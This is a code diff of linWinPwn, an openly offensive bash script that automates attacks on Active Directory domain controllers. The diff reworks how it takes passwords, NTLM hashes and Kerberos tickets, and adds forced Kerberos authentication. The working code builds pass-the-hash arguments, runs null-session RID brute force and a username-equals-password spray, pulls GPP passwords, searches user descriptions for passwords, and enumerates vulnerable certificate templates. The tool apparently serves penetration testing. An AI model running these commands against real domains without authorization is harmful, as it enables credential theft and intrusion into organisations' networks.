@@ -23,8 +23,13 @@ users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 if [ ! -f "${users_list}" ]; then users_list="${wordlists_dir}/cirt-default-usernames.txt"; fi
 curr_targets="Domain Controllers"
 custom_target_scanned=false
+nullsess_bool=false
+pass_bool=false
+hash_bool=false
+kerb_bool=false
 autoconfig_bool=false
 ldaps_bool=false
+forcekerb_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
@@ -64,7 +69,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.7.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.7.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -77,15 +82,17 @@ help_linWinPwn () {
     echo -e "-h/--help         Show the help message"
     echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
     echo -e "-u/--username     Username (default: empty)"
-    echo -e "-p/--password     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
+    echo -e "-p/-H/-K          Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
     echo -e "-o/--output       Output directory (default: current dir)"
-    echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts (positional argument: at the end)" 
+    echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts"
+    echo -e "--ldaps           Use LDAPS instead of LDAP (port 636)"
+    echo -e "--force-kerb      Use Kerberos authentication instead of NTLM (requires password or NTLM hash)"
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
-    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user -p password_or_hash_or_kerbticket" >&2;
+    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user [-p password or -H hash or -k kerbticket]" >&2;
     echo -e ""
 }
 
@@ -96,8 +103,9 @@ while test $# -gt 0; do
             --domain) domain="${2}"; shift;;
             -u) user="${2}"; shift;; #leave empty for anonymous login
             --user) user="${2}"; shift;; #leave empty for anonymous login
-            -p) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
-            --password) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
+            -p) password="${2}"; pass_bool=true; shift;; #password
+            -H) hash="${2}"; hash_bool=true; shift;; #NTLM hash
+            -K) krb5cc="${2}"; kerb_bool=true; shift;; #location of krb5cc ticket
             -t) dc_ip="${2}"; shift;; #mandatory
             --target) dc_ip="${2}"; shift;; #mandatory
             -M) modules="${2}"; shift;; #comma separated modules to run
@@ -106,6 +114,7 @@ while test $# -gt 0; do
             --output) output_dir="$(realpath ${2})"; shift;;
             --auto-config) autoconfig_bool=true; args+=($1);;
             --ldaps) ldaps_bool=true; args+=($1);;
+            --force-kerb) forcekerb_bool=true; args+=($1);;
             -h) help_linWinPwn; exit;;
             --help) help_linWinPwn; exit;;
             *) print_banner; echo -e "${RED}[-] Unknown option:${NC} ${1}"; echo -e "Use -h for help"; exit 1;;
@@ -132,15 +141,19 @@ prepare (){
 
     dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
     dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
-    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
-    kdc=""
 
     if [ -z "$dc_domain" ] ; then
         echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
         exit 1
-    elif [ -z "$domain" ] ; then
-        domain=${dc_domain}
+    elif [ "$dc_domain" == "$dc_ip" ] && [ -z "$domain" ]; then
+        echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
+        exit 1
+    else 
+        if [ -z "$domain" ]; then domain=$dc_domain; else dc_domain=$domain; fi
     fi
+
+    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
+    kdc=""
 
     if [ "${autoconfig_bool}" == true ]; then
         echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
@@ -154,13 +167,8 @@ prepare (){
         fi
     fi
 
-    nullsess_bool=false
-    hash_bool=false
-    kerb_bool=false
-
     if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
     output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
-
     servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
     dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
     sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
@@ -168,6 +176,21 @@ prepare (){
     dc_hostname_list="${output_dir}/DomainRecon/servers_list_dc_${dc_domain}.txt"
     sql_hostname_list="${output_dir}/DomainRecon/servers_list_sql_${dc_domain}.txt"
     dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"
+    target=${dc_ip}
+    target_dc=${dc_ip_list}
+    target_sql=${sql_ip_list}
+
+    mkdir -p ${output_dir}/Scans
+    mkdir -p ${output_dir}/DomainRecon/BloodHound
+    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
+    mkdir -p ${output_dir}/DomainRecon/ADCS
+    mkdir -p ${output_dir}/DomainRecon/SilentHound
+    mkdir -p ${output_dir}/DomainRecon/ldeepDump
+    mkdir -p ${output_dir}/Kerberos
+    mkdir -p ${output_dir}/Shares/SharesDump
+    mkdir -p ${output_dir}/Credentials
+    mkdir -p ${output_dir}/Vulnerabilities
+    mkdir -p /tmp/shared
 
     if [ ! -f "${users_list}" ] ; then
         echo -e "${RED}[-] Users list file not found${NC}"
@@ -178,13 +201,11 @@ prepare (){
     fi
 
     #Check if null session is used
-    if [ "${user}" == "" ]  && [ "${password}" == "" ]; then
+    if [ "${user}" == "" ] && [ "${pass_bool}" == false ] && [ "${hash_bool}" == false ] && [ "${kerb_bool}" == false ] ; then
         nullsess_bool=true
-        target=${dc_ip}
-        target_dc=${dc_ip_list}
-        target_sql=${sql_ip_list}
         argument_cme=("-u" "" "-p" "")
         argument_imp="${domain}/"
+        argument_imp_gp="${domain}/"
         argument_smbmap=""
         argument_ldeep="-d ${dc_domain} -a"
         argument_pre2k="-d ${domain}"
@@ -196,12 +217,10 @@ prepare (){
         exit 1
     
     #Check if empty password is used
-    elif [ "${password}" == "" ]; then
-        target=${dc_ip}
-        target_dc=${dc_ip_list}
-        target_sql=${sql_ip_list}
+    elif [ "${password}" == "" ] && [ "${hash}" == "" ] && [ "${krb5cc}" == "" ] ; then
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "")
         argument_imp="${domain}/${user}:''" 
+        argument_imp_gp="${domain}/${user}:''" 
         argument_bhd="-u ${user}@${domain} -p ''"
         argument_ldapdns="-u ${domain}\\${user} -p ''"
         argument_smbmap="-d ${domain} -u ${user} -p ''"
@@ -214,60 +233,17 @@ prepare (){
         argument_targkerb="-d ${domain} -u ${user} -p ''"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
     
-    #Check if NTLM hash is used, and complete with empty LM hash
-    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
-        hash_bool=true
-        if [ "$(echo $password | cut -d ":" -f 1)" == "" ]; then
-            password="aad3b435b51404eeaad3b435b51404ee"$password
-        fi
-        target=${dc_ip}
-        target_dc=${dc_ip_list}
-        target_sql=${sql_ip_list}
-        argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${password}")
-        argument_imp=" -hashes ${password} ${domain}/${user}"
-        argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $password 1 32)"
-        argument_bhd="-u ${user}@${domain} --hashes ${password}"
-        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
-        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
-        argument_certi_py="${domain}/${user} --hashes ${password}"
-        argument_certipy="-u ${user}@${domain} -hashes ${password}"
-        argument_ldeep="-d ${domain} -u ${user} -H ${password}"
-        argument_pre2k="-d ${domain} -u ${user} -hashes ${password}"
-        argument_certsync="-d ${domain} -u ${user} -hashes ${password}"
-        argument_donpapi=" -H ${password} ${domain}/${user}"
-        argument_silenthd="-u ${domain}\\${user} --hashes ${password}"
-        argument_windap="-d ${domain} -u ${user} --hash ${password}"
-        argument_targkerb="-d ${domain} -u ${user} -H ${password}"
-        auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
+    #Check if multiple credentials provided
+    elif ([ "${pass_bool}" == true ] && [ "${hash_bool}" == true ]) || ([ "${pass_bool}" == true ] && [ "${kerb_bool}" == true ]) || ([ "${hash_bool}" == true ] && [ "${kerb_bool}" == true ]) || ([ "${forcekerb_bool}" == true ] && [ "${kerb_bool}" == true ])  ; then
+        echo -e "${RED}[i]${NC} Please choose between either -p [--force-kerb], -H [--force-kerb] or -K ..."
+        exit 1
     
-    #Check if kerberos ticket is used
-    elif [ -f "${password}" ] ; then
-        kerb_bool=true
-        target=${dc_domain}
-        target_dc=${dc_hostname_list}
-        target_sql=${sql_hostname_list}
-        export KRB5CCNAME=$(realpath $password)
-        argument_cme=("-d" "${domain}" "-u" "${user}" "--use-kcache")
-        argument_imp="-k -no-pass ${domain}/${user}"
-        argument_enum4linux="-w ${domain} -u ${user} -K ${password}"
-        argument_bhd="-u ${user}@${domain} -k -no-pass"
-        argument_certi_py="${domain}/${user} -k --no-pass"
-        argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
-        argument_ldeep="-d ${domain} -u ${user} -k"
-        argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
-        argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
-        argument_donpapi="-k -no-pass ${domain}/${user}"
-        argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
-        kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
-        auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
-    
-    #Password authentication is used
-    else
-        target=${dc_ip}
-        target_dc=${dc_ip_list}
-        target_sql=${sql_ip_list}
+    fi
+
+    if [ "${pass_bool}" == true ] ; then
         argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "${password}")
         argument_imp="${domain}/${user}:${password}"
+        argument_imp_gp="${domain}/${user}:${password}"
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         argument_bhd="-u ${user}@${domain} -p ${password}"
@@ -284,34 +260,85 @@ prepare (){
         auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
     fi
 
-    if [ "${nullsess_bool}" == false ] ; then
-        auth_check=$(${crackmapexec} smb ${target} "${argument_cme[@]}" | grep "\[-\]")
-        if [ ! -z "$auth_check" ] ; then
-            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
+    #Check if NTLM hash is used, and complete with empty LM hash
+    if [ "${hash_bool}" == true ] ; then
+        if ([ "${#hash}" -eq 65 ] && [ "$(expr substr $hash 33 1)" == ":" ]) || ([ "${#hash}" -eq 33 ] && [ "$(expr substr $hash 1 1)" == ":" ]) ; then
+            if [ "$(echo $hash | cut -d ":" -f 1)" == "" ] ; then
+                hash="aad3b435b51404eeaad3b435b51404ee"$hash
+            fi
+            argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${hash}")
+            argument_imp=" -hashes ${hash} ${domain}/${user}"
+            argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
+            argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 1 32)"
+            argument_bhd="-u ${user}@${domain} --hashes ${hash}"
+            argument_ldapdns="-u ${domain}\\${user} -p ${hash}"
+            argument_smbmap="-d ${domain} -u ${user} -p ${hash}"
+            argument_certi_py="${domain}/${user} --hashes ${hash}"
+            argument_certipy="-u ${user}@${domain} -hashes ${hash}"
+            argument_ldeep="-d ${domain} -u ${user} -H ${hash}"
+            argument_pre2k="-d ${domain} -u ${user} -hashes ${hash}"
+            argument_certsync="-d ${domain} -u ${user} -hashes ${hash}"
+            argument_donpapi=" -H ${hash} ${domain}/${user}"
+            argument_silenthd="-u ${domain}\\${user} --hashes ${hash}"
+            argument_windap="-d ${domain} -u ${user} --hash ${hash}"
+            argument_targkerb="-d ${domain} -u ${user} -H ${hash}"
+            auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
+        else
+            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
+            exit 1
+        fi
+    fi
+    
+    #Check if kerberos ticket is used
+    if [ "${kerb_bool}" == true ] || [ "${forcekerb_bool}" == true ] ; then
+    
+        if [ "${kerb_bool}" == true ] ; then
+            argument_cme=("-d" "${domain}" "-u" "${user}" "--use-kcache")
+            cme_temp_patch="-d linwinpwn"
+        fi
+        if [ "${forcekerb_bool}" == true ] ; then
+            argument_cme=("${argument_cme[@]}" "-k")
+            cme_temp_patch=""
+            target=${dc_FQDN}
+            current_dir=$(pwd)
+            cd ${output_dir}/Credentials
+            echo -e ""
+            echo -e "${YELLOW}[i]${NC} Requesting TGT for current user..."
+            ${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip} | grep -v "Impacket" | sed '/^$/d'
+            cd ${current_dir}
+            krb5cc="${output_dir}/Credentials/${user}.ccache"
+        fi
+
+        if [ -f "${krb5cc}" ] ; then
+            target=${dc_FQDN}
+            export KRB5CCNAME=$(realpath $krb5cc)
+            argument_imp="-k -no-pass ${domain}/${user}"
+            argument_enum4linux="-w ${domain} -u ${user} -K ${krb5cc}"
+            argument_bhd="-u ${user}@${domain} -k -no-pass -p ''"
+            argument_certi_py="${domain}/${user} -k --no-pass"
+            argument_certipy="-u ${user}@${domain} -k -no-pass -target ${dc_FQDN}"
+            argument_ldeep="-d ${domain} -u ${user} -k"
+            argument_pre2k="-d ${domain} -u ${user} -k -no-pass"
+            argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
+            argument_donpapi="-k -no-pass ${domain}/${user}"
+            argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
+            kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
+            auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $krb5cc)"
+        else
+            echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
             exit 1
         fi
     fi
 
-    mkdir -p ${output_dir}/Scans
-    mkdir -p ${output_dir}/DomainRecon/BloodHound
-    mkdir -p ${output_dir}/DomainRecon/LDAPDomainDump
-    mkdir -p ${output_dir}/DomainRecon/ADCS
-    mkdir -p ${output_dir}/DomainRecon/SilentHound
-    mkdir -p ${output_dir}/DomainRecon/ldeepDump
-    mkdir -p ${output_dir}/Kerberos
-    mkdir -p ${output_dir}/Shares/SharesDump
-    mkdir -p ${output_dir}/Credentials
-    mkdir -p ${output_dir}/Vulnerabilities
-    mkdir -p /tmp/shared
+    if [ "${nullsess_bool}" == false ] ; then
+        auth_check=$(${crackmapexec} smb ${target} "${argument_cme[@]}" 2>&1| grep "\[-\]\|Traceback" -A 10)
+        if [ ! -z "$auth_check" ] ; then
+            echo $auth_check
+            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
+            exit 1
+        fi
+    fi
     echo -e ""
-    
-    if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
-    if [ ! $(grep ${dc_ip} ${servers_ip_list}) ]; then echo ${dc_ip} >> ${servers_ip_list}; fi
-    if [ ! -f ${dc_ip_list} ]; then /bin/touch ${dc_ip_list}; fi
-    if [ ! $(grep ${dc_ip} ${dc_ip_list}) ]; then echo ${dc_ip} >> ${dc_ip_list}; fi
-    if [ ! -f ${dc_hostname_list} ]; then /bin/touch  ${dc_hostname_list}; fi
-    if [ ! $(grep ${dc_FQDN} ${dc_hostname_list}) ]; then echo ${dc_FQDN} >> ${dc_hostname_list}; fi
-
 }
 
 dns_enum () {
@@ -324,6 +351,7 @@ dns_enum () {
             if [ "${kerb_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
             else
+                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                 ${adidnsdump} ${argument_ldapdns} ${ldaps_param} --dns-tcp ${dc_ip}
                 mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
@@ -335,6 +363,13 @@ dns_enum () {
             echo -e "${YELLOW}[i] DNS dump found ${NC}"
         fi
     fi
+
+    if [ ! -f ${servers_ip_list} ]; then /bin/touch ${servers_ip_list}; fi
+    if [ ! $(grep ${dc_ip} ${servers_ip_list}) ]; then echo ${dc_ip} >> ${servers_ip_list}; fi
+    if [ ! -f ${dc_ip_list} ]; then /bin/touch ${dc_ip_list}; fi
+    if [ ! $(grep ${dc_ip} ${dc_ip_list}) ]; then echo ${dc_ip} >> ${dc_ip_list}; fi
+    if [ ! -f ${dc_hostname_list} ]; then /bin/touch  ${dc_hostname_list}; fi
+    if [ ! $(grep ${dc_FQDN} ${dc_hostname_list}) ]; then echo ${dc_FQDN} >> ${dc_hostname_list}; fi
     echo -e ""
 }
 
@@ -451,7 +486,6 @@ enum4linux_enum () {
 }
 
 cme_rpc_enum () {
-    if [ "${kerb_bool}" == true ] ; then cme_temp_patch="-d linwinpwn"; else cme_temp_patch=""; fi
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (RPC Null session)${NC}"
         ${crackmapexec} smb ${target} "${argument_cme[@]}" --users ${cme_temp_patch} > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
@@ -469,11 +503,11 @@ cme_rpc_enum () {
     fi
     echo -e ""
     echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
-    ${crackmapexec} smb ${target} "${argument_cme[@]}" --pass-pol ${cme_temp_patch}  2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target} "${argument_cme[@]}" --pass-pol ${cme_temp_patch} 2>&1 | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] GPP Enumeration${NC}"
-    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
-    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_autologin 2>&1 | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_password 2>&1 | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -496,37 +530,37 @@ cme_ldap_enum () {
     fi
     echo -e ""
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --password-not-required --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} --password-not-required --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] ADCS Enumeration${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M adcs --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M get-desc-users --kdcHost "${kdc}.${dc_domain}" 2>/dev/null > ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M get-desc-users --kdcHost "${kdc}.${dc_domain}" 2>&1 > ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
     /bin/cat ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass\|pwd" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt 2>&1
     if [ ! -s ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
     fi
     echo -e ""
     echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M MAQ --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M MAQ --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Subnets Enumeration${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M subnets --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_subnets_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" ${ldaps_param} -M subnets --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_subnets_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] LDAP-signing check${NC}"
-    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-signing --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
-    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-checker --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-signing --kdcHost "${kdc}.${dc_domain}" ${cme_temp_patch} 2>&1 | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} -M ldap-checker --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
-    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} --trusted-for-delegation --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" ${ldaps_param} --trusted-for-delegation --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 ridbrute_attack () {
     echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        ${crackmapexec} smb ${target} "${argument_cme[@]}" --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
+        ${crackmapexec} smb ${target} "${argument_cme[@]}" --rid-brute 2>&1 > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
@@ -545,7 +579,7 @@ userpass_cme_check () {
          echo -e "${PURPLE}[-] No users found! Please run users enumeration and try again..${NC}"
     else
         echo -e "${YELLOW}[i] Finding users with Password = username using crackmapexec. This may take a while...${NC}"
-        ${crackmapexec} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success 2>/dev/null > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success 2>&1 > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1
         /bin/cat ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt"
         if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt" ] ; then
             echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
@@ -584,7 +618,7 @@ deleg_enum_imp () {
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
-        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
@@ -593,16 +627,16 @@ deleg_enum_imp () {
 }
 
 certi_py_enum () {
-    if [[ ! -f "${certi_py}" ]] && [[ ! -f "${impacket_getTGT}" ]] ; then
-        echo -e "${RED}[-] Please verify the installation of certi.py and the location of getTGT.py${NC}"
+    if [[ ! -f "${certi_py}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
     else
         echo -e "${BLUE}[*] certi.py Enumeration${NC}"
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
         else
-            ${certi_py} list ${argument_certi_py} -n --dc-ip ${dc_ip} --class ca | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
-            ${certi_py} list ${argument_certi_py} -n --dc-ip ${dc_ip} --class service | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
-            ${certi_py} list ${argument_certi_py} -n --dc-ip ${dc_ip} --vuln --enabled | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
+            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
+            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
+            ${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -613,15 +647,19 @@ certipy_enum () {
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
         echo -e "${BLUE}[*] Certipy Enumeration${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/ADCS/*_Certipy* 2>/dev/null)" ] ; then
+            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
         else
-            current_dir=$(pwd)
-            cd ${output_dir}/DomainRecon/ADCS
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
